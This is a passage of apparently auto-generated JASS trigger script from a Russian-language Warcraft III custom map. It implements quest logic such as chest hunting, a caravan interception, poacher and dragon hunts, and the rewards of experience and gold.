call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
if BP4() then
set SS=SS+1
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Сундуков открыто:|r "+(I2S(SS)+"|c00ffff00/20|r"))
call SetUnitAnimation(Iq,"Death")
call RemoveRect(Cz)
if BP3() then
call DisplayTextToForce(GetPlayersAll(),"|c00ffff00Вы отыскали и вскрыли все сундуки! Вернитесь к Алхимику.")
call EnableTrigger(aw)
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1.mdx")
set Us[31]=GetLastCreatedEffectBJ()
else
endif
else
endif
endfunction
function BP6 takes nothing returns nothing
set av=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(av,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddCondition(av,Condition(function BPQ))
call TriggerAddAction(av,function BP5)
endfunction
function BP7 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4E616C63) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BP8 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49304344,GetRectCenter(Cy))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Охотники за сокровищами\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: Неограниченый|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Охотники за сокровищами","Я люблю золото! А вы любите золото? Все любят золото! Ух..... Поможете мне в одном деле? Вот Вам ключ, найдите в Великом Мелероте |c00ffff0020 сундуков с золотом|r и вскройте их! ЧТОБЫ ОНИ СТОЯЛИ ОТКРЫТЫ, АХАХАХ. Не спрашивайте зачем, бегите, в погоню за золотом! После выполнения этого поручения я стану для Вас больше, чем просто другом.
|c006969FFУровень задания: Неограниченый|r
","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[31]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[31])
call AddSpecialEffectTargetUnitBJ("overhead",Kn,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[31]=GetLastCreatedEffectBJ()
call TriggerSleepAction(2880.)
call DisableTrigger(ay)
endfunction
function BP9 takes nothing returns nothing
set ax=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ax,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ax,Condition(function BP7))
call TriggerAddAction(ax,function BP8)
endfunction
function BQB takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4E616C63) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQC takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"О как! Справились! Отлично, ребятки. Теперь я разрешу Вам купить у меня отличные вещицы. Раньше я торговал разными настойками и травами, но, увы, дело не прыбыльное, поэтому теперь в моих товарах много чего иного.")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FFFF00Доступ к товарам Алхимика|r")
call QuestSetCompletedBJ(YX[31],true)
call DestroyQuest(YX[31])
set Sf=Sf+1
call UnitAddAbilityBJ($41706974,Kn)
call UnitAddAbilityBJ($416E6532,Kn)
call DestroyEffectBJ(Us[31])
endfunction
function BQD takes nothing returns nothing
set aw=CreateTrigger()
call DisableTrigger(aw)
call TriggerRegisterAnyUnitEventBJ(aw,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aw,Condition(function BQB))
call TriggerAddAction(aw,function BQC)
endfunction
function BQE takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E636867) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQF takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303257
endfunction
function BQG takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"move",GetRectCenter(DJ))
endfunction
function BQH takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=43) then
return false
endif
return true
endfunction
function BQI takes nothing returns nothing
if BQH() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[32])
call AddSpecialEffectTargetUnitBJ("overhead",Ii,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[32]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Караван\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Наркоторговля в наше время очень популярна, не так ли? Но я пытась бороться с этой заразой всеми силами. если есть желание помочь в этом благом деле, что ж - пожалуйста. Через 15 секунд с Суральда выдвинется 3 повозки с контрабандой. Если хотя бы одна из них достигнет Орхеста - считайте что вы зря старались")
call TriggerSleepAction(15.)
call CreateNUnitsAtLoc(3,$68303257,Player(10),GetRectCenter(Fu),bj_UNIT_FACING)
set ST[100]=GetUnitsOfPlayerMatching(Player(10),Condition(function BQF))
call ForGroupBJ(ST[100],function BQG)
call DestroyGroup(ST[100])
call EnableTrigger(ai)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000043|r уровня",.027,255,255,255)
endif
endfunction
function BQJ takes nothing returns nothing
set az=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(az,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(az,Condition(function BQE))
call TriggerAddAction(az,function BQI)
endfunction
function BQK takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303257
endfunction
function BQL takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"move",GetRectCenter(DJ))
endfunction
function BQM takes nothing returns nothing
set ST[100]=GetUnitsOfPlayerMatching(Player(10),Condition(function BQK))
call ForGroupBJ(ST[100],function BQL)
call DestroyGroup(ST[100])
call DestroyGroup(ST[100])
endfunction
function BQN takes nothing returns nothing
set ai=CreateTrigger()
call DisableTrigger(ai)
call TriggerRegisterTimerEventPeriodic(ai,5.)
call TriggerAddAction(ai,function BQM)
endfunction
function BQO takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303257) then
return false
endif
return true
endfunction
function BQP takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ff0000Задание \"Караван\" Провалено!!!")
call RemoveUnit(GetTriggerUnit())
call DisableTrigger(ai)
call DestroyEffectBJ(Us[32])
endfunction
function BQQ takes nothing returns nothing
set a0=CreateTrigger()
call TriggerRegisterEnterRectSimple(a0,DJ)
call TriggerAddCondition(a0,Condition(function BQO))
call TriggerAddAction(a0,function BQP)
endfunction
function BQR takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BQS takes nothing returns boolean
if not (Sf>=35) then
return false
endif
return true
endfunction
function BQT takes nothing returns nothing
if BQS() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"О, привет. Ты ещё не знаешь? Нууу... Все знают, а ты нет. Что ж, слушай. 

В этом мире обитает |c00ff96963 могущественных демона|r. Тройка стражей Преисподни, они весьма могущественны, поэтому даже не думай, что сможешь легко одолеть их. Изначально скрыты от чужих глаз, эти твари не желают сражаться с кем-либо, принимая нейтральную сторону. Но если на них напасть, ууууух... Пощады не ждите. |c0000ff00Я открою для Вас первого из этой тройки путем снятия с него чар невидимости|r. |c00ffff00Главное найди его - и понеслась!")
call CreateNUnitsAtLoc(1,$68303330,Player(11),GetRectCenter(GI),bj_UNIT_FACING)
else
call DisplayTextToForce(GetPlayersAll(),"Ну и чего ты пришел? Ты ещё не заслужил мое доверие, ты не готов к этому испытанию! Иди и приходи тогда, когда поможешь более чем 35 жителям Мэлерота.")
endif
endfunction
function BQU takes nothing returns nothing
set a1=CreateTrigger()
call TriggerRegisterEnterRectSimple(a1,GH)
call TriggerAddCondition(a1,Condition(function BQR))
call TriggerAddAction(a1,function BQT)
endfunction
function BQV takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4864676F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
if not (UnitHasItem(GetTriggerUnit(),GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$74657870))==true) then
return false
endif
return true
endfunction
function BQW takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"Для того, чтобы улучшить |c00ffff00Сеты Алхимика|r, просто |c00ff7f00скрестите свой Сет с Древним пергаментом и с одной из вещей Феникса|r. Думаю, на счет вещей сами розберетесь.")
endfunction
function BQX takes nothing returns nothing
set a2=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(a2,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a2,Condition(function BQV))
call TriggerAddAction(a2,function BQW)
endfunction
function BQY takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65646F74) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQZ takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=4) then
return false
endif
return true
endfunction
function BQa takes nothing returns nothing
if BQZ() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[33])
call AddSpecialEffectTargetUnitBJ("overhead",I6,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[33]=GetLastCreatedEffectBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Охотники\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 4-10|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Охотники","|cffffcc00Задание получено:|r \"Охотники\".
Многие браконьеры повадились убивать невинных зверушек в лесу. Убейте не меньше 3-х паршивцев и приходите за наградой, лады? Очистим вместе лес от этих тварей.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[33]=GetLastCreatedQuestBJ()
call CreateNUnitsAtLoc(1,$68303342,Player(10),GetRectCenter(Bx),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$68303342,Player(10),GetRectCenter(Gp),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$68303342,Player(10),GetRectCenter(S),bj_UNIT_FACING)
call EnableTrigger(ai)
else
call ne(GetTriggerUnit(),"Задание с |c00ff00004|r уровня",.027,255,255,255)
endif
endfunction
function BQb takes nothing returns nothing
set a3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(a3,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a3,Condition(function BQY))
call TriggerAddAction(a3,function BQa)
endfunction
function BQc takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303342) then
return false
endif
return true
endfunction
function BQd takes nothing returns boolean
if not (Sj==3) then
return false
endif
return true
endfunction
function BQe takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c00ff9696Браконьер умер!")
set Sj=Sj+1
if BQd() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Вы убили достаточно браконьеров. Вернитесь за наградой.")
call DestroyEffectBJ(Us[33])
call AddSpecialEffectTargetUnitBJ("overhead",I6,"war3mapImported\\QuestYellow1.mdx")
set Us[33]=GetLastCreatedEffectBJ()
call EnableTrigger(a5)
else
endif
endfunction
function BQf takes nothing returns nothing
set a4=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(a4,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(a4,Condition(function BQc))
call TriggerAddAction(a4,function BQe)
endfunction
function BQg takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65646F74) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQh takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BQi takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BQj takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BQk takes nothing returns boolean
return GetBooleanAnd(BQi(),BQj())
endfunction
function BQl takes nothing returns boolean
return GetBooleanAnd(BQh(),BQk())
endfunction
function BQm takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=4) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=10) then
return false
endif
return true
endfunction
function BQn takes nothing returns nothing
if BQm() then
call AddHeroXP(GetEnumUnit(),900,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+900
else
endif
endfunction
function BQo takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=4) then
return false
endif
return true
endfunction
function BQp takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=4) then
return false
endif
return true
endfunction
function BQq takes nothing returns nothing
if BQp() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[33])
call QuestSetCompletedBJ(YX[33],true)
call DestroyQuest(YX[33])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BQl))
call ForGroupBJ(Th,function BQn)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF900 опыта|r, |c00ffff00200 золота|r, |c00ff96964 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BQo() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+12
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00004|r уровня",.027,255,255,255)
endif
endfunction
function BQr takes nothing returns nothing
set a5=CreateTrigger()
call DisableTrigger(a5)
call TriggerRegisterAnyUnitEventBJ(a5,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a5,Condition(function BQg))
call TriggerAddAction(a5,function BQq)
endfunction
function BQs takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6A6B73) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQt takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[34])
call AddSpecialEffectTargetUnitBJ("overhead",If,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[34]=GetLastCreatedEffectBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Поджарь их!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 13-18|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Поджарь их!","Видели этот костер? Он не горит, а без тепла нам холодно работать... Рубить местные деревья - большой грех, ибо они волшебны. Попробуйте зажечь пламя с помощью трупов врагов.
|c006969FFУровень задания: 13-18|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[34]=GetLastCreatedQuestBJ()
call EnableTrigger(a7)
endfunction
function BQu takes nothing returns nothing
set a6=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(a6,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a6,Condition(function BQs))
call TriggerAddAction(a6,function BQt)
endfunction
function BQv takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(PLAYER_NEUTRAL_AGGRESSIVE)) then
return false
endif
if not (RectContainsUnit(Db,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BQw takes nothing returns boolean
if not (Sk==10) then
return false
endif
return true
endfunction
function BQx takes nothing returns nothing
set Sk=Sk+1
call AddSpecialEffectLocBJ(GetRandomLocInRect(Da),"Abilities\\Spells\\Human\\FlameStrike\\FlameStrikeDamageTarget.mdl")
call DisplayTextToForce(GetPlayersAll(),"Давайте, жарьте их! Огонь набирает силу!")
if BQw() then
call EnableTrigger(a8)
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[34])
call AddSpecialEffectTargetUnitBJ("overhead",If,"war3mapImported\\QuestYellow1.mdx")
set Us[34]=GetLastCreatedEffectBJ()
call DisplayTextToForce(GetPlayersAll(),"Достаточно! Костер достаточно разгорелся!")
else
endif
endfunction
function BQy takes nothing returns nothing
set a7=CreateTrigger()
call DisableTrigger(a7)
call TriggerRegisterAnyUnitEventBJ(a7,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(a7,Condition(function BQv))
call TriggerAddAction(a7,function BQx)
endfunction
function BQz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6A6B73) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BQ0 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BQ1 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BQ2 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BQ3 takes nothing returns boolean
return GetBooleanAnd(BQ1(),BQ2())
endfunction
function BQ4 takes nothing returns boolean
return GetBooleanAnd(BQ0(),BQ3())
endfunction
function BQ5 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=13) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=18) then
return false
endif
return true
endfunction
function BQ6 takes nothing returns nothing
if BQ5() then
call AddHeroXP(GetEnumUnit(),1500,false)
else
endif
endfunction
function BQ7 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=13) then
return false
endif
return true
endfunction
function BQ8 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[34])
call QuestSetCompletedBJ(YX[34],true)
call DestroyQuest(YX[34])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BQ4))
call ForGroupBJ(Th,function BQ6)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1500 опыта|r, |c00ffff00200 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BQ7() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BQ9 takes nothing returns nothing
set a8=CreateTrigger()
call DisableTrigger(a8)
call TriggerRegisterAnyUnitEventBJ(a8,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a8,Condition(function BQz))
call TriggerAddAction(a8,function BQ8)
endfunction
function BRB takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68303343) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BRC takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[35])
call AddSpecialEffectTargetUnitBJ("overhead",Je,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[35]=GetLastCreatedEffectBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Поход на дракона!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 17-23|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Поход на дракона","Ребят, я тут собираюсь открыть сезон охоты на Бронзовых Драконов. Нет ли у Вас желания принять участие? Но предупреждаю сразу, маленьких я трогать не буду, мне нужен самый жирный из них. Готовы? Через минуту выдвигаемся.
|c006969FFУровень задания: 17-23|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[35]=GetLastCreatedQuestBJ()
call TriggerSleepAction(20.)
call IssuePointOrderLoc(Je,"attack",GetRectCenter(Bp))
call EnableTrigger(bB)
endfunction
function BRD takes nothing returns nothing
set a9=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(a9,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(a9,Condition(function BRB))
call TriggerAddAction(a9,function BRC)
endfunction
function BRE takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"Задание \"Охота на дракона\" |c00ff0000Провалено!!!")
call QuestSetFailed(YX[35],true)
call DestroyEffectBJ(Us[35])
endfunction
function BRF takes nothing returns nothing
set bC=CreateTrigger()
call TriggerRegisterUnitEvent(bC,Je,EVENT_UNIT_DEATH)
call TriggerAddAction(bC,function BRE)
endfunction
function BRG takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303530) then
return false
endif
if not (IsUnitAliveBJ(Je)==true) then
return false
endif
return true
endfunction
function BRH takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BRI takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BRJ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BRK takes nothing returns boolean
return GetBooleanAnd(BRI(),BRJ())
endfunction
function BRL takes nothing returns boolean
return GetBooleanAnd(BRH(),BRK())
endfunction
function BRM takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=17) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=23) then
return false
endif
return true
endfunction
function BRN takes nothing returns nothing
if BRM() then
call AddHeroXP(GetEnumUnit(),2600,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2600
else
endif
endfunction
function BRO takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=17) then
return false
endif
return true
endfunction
function BRP takes nothing returns nothing
call DestroyEffectBJ(Us[35])
call RemoveUnit(Je)
call QuestSetCompletedBJ(YX[35],true)
call DestroyQuest(YX[35])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Ну что, Герои, спасибо огромное. Я убываю, вот вам небольшая Награда.")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BRL))
call ForGroupBJ(Th,function BRN)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2600 опыта|r, |c00ffff00300 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BRO() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BRQ takes nothing returns nothing
set bB=CreateTrigger()
call DisableTrigger(bB)
call TriggerRegisterAnyUnitEventBJ(bB,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(bB,Condition(function BRG))
call TriggerAddAction(bB,function BRP)
endfunction
function BRR takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E66746B) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BRS takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
function BRT takes nothing returns nothing
if BRS() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[36])
call AddSpecialEffectTargetUnitBJ("overhead",Im,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[36]=GetLastCreatedEffectBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Трое Слуг\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 25+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Трое Слуг","|c006969FFУровень задания: 25+|r
О, новые трупы подоспели. Да-да, я о вас, жалкие смертные! АХАХАХ, они Вас заживо сьедят!!! Повелитель цветных анимаций, Ядовитый монстр и Рыцать из потустороннего мира. Убьете всех троих - приходите","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[36]=GetLastCreatedQuestBJ()
set Sn=0
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BRU takes nothing returns nothing
set bD=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bD,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bD,Condition(function BRR))
call TriggerAddAction(bD,function BRT)
endfunction
function BRV takes nothing returns boolean
if not (Sn>=3) then
return false
endif
return true
endfunction
function BRW takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Один из Слуг Убит!!!")
set Sn=Sn+1
if BRV() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"Слуги убиты! Награда ждет!")
call EnableTrigger(bF)
call DestroyEffectBJ(Us[36])
call AddSpecialEffectTargetUnitBJ("overhead",Im,"Objects\\RandomObject\\RandomObject.mdl")
set Us[36]=GetLastCreatedEffectBJ()
else
endif
endfunction
function BRX takes nothing returns nothing
set bE=CreateTrigger()
call TriggerRegisterUnitEvent(bE,Lq,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(bE,LB,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(bE,LR,EVENT_UNIT_DEATH)
call TriggerAddAction(bE,function BRW)
endfunction
function BRY takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E66746B) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BRZ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BRa takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BRb takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BRc takes nothing returns boolean
return GetBooleanAnd(BRa(),BRb())
endfunction
function BRd takes nothing returns boolean
return GetBooleanAnd(BRZ(),BRc())
endfunction
function BRe takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=25) then
return false
endif
return true
endfunction
function BRf takes nothing returns nothing
if BRe() then
call AddHeroXP(GetEnumUnit(),3500,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3500
else
endif
endfunction
function BRg takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=25) then
return false
endif
return true
endfunction
function BRh takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
